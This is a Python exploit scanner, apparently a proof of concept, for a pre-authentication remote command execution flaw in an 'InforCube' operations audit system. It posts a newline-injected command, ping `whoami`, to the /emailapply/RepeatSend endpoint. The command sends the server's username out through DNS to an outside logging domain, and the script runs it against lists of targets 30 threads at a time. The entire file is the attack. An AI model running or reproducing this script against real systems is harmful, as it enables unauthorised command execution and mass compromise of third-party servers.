import requests
from multiprocessing.dummy import Pool
import argparse
requests.packages.urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="某讯信息 InforCube运维管理审计系统 RepeatSend 前台RCE漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file, 'r+')
            for i in f.readlines():
                target = i.strip()
                if 'http' in i:
                    targets.append(target)
                else:
                    target = f"http://{i}"
                    targets.append(target)
            pool = Pool(30)
            pool.map(check, targets)
    except Exception as s:
        pass
def check(target):
    url = f'{target}/emailapply/RepeatSend'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type':'application/x-www-form-urlencoded',
    }
    data = {
        'id':'%0aping `whoami`.rksghqxnbe.dgrh3.cn',
    }
    response = requests.post(url=url, headers=headers, verify=False,data=data,timeout=3)
    try:
        if response.status_code == 200 and 'msg' in response.text:
            print(f'存在漏洞 {url}')
        else:
             print(f'不存在漏洞  {url}')
    except Exception as e:
        print(f"[timeout] {url}")

if __name__ == '__main__':
    main()